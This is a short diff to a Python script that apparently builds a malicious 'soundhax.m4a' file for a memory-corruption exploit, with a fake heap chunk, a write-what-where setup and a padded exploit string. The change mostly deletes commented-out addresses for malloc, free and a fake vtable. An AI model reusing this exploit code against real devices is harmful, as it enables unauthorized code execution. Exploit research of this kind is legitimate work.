@@ -43,14 +43,6 @@ goal:
 4th ideally is 0 so it finds only the first chunk
 """
 
-#malloc = 0x002A9198
-#free = 0x002A9190
-#nop = 0x002A91A8 # I don't know what this does, but it's in the vtable.
-
-#memcpy_to_stack = 0x00265D5C
-#fake_free = memcpy_to_stack
-#fake_vtable = p(malloc) + p(fake_free) + p(nop)
-
 """
 fake malloc chunk, located on our stack :)
 
@@ -89,10 +81,6 @@ r1 = what
 r2 = where - 12
 
 UNICODE_MARKER = '\xff\xfe' # unicode marker
-
-# where the exp string actually ends up
-# I think I don't need this anymore but it seems to fail otherwise?
-exp_vaddr = 0x1400160C
 
 exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
 exp += " \x00"*((772-len(exp)) / 2)
@@ -333,4 +321,3 @@ def to_string(tree):
 
 with open('./soundhax.m4a', 'w') as f:
   f.write(to_string(l))
-
